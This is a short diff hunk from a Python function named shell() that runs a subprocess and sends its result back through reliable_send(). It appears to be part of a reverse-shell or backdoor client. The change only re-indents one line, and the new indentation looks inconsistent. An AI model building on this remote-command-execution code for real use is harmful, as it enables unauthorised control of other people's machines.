@@ -365,7 +365,7 @@ def shell():
                                          stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
                 #print(result)
-                reliable_send(result)
+              reliable_send(result)
             except:
                 pass
 
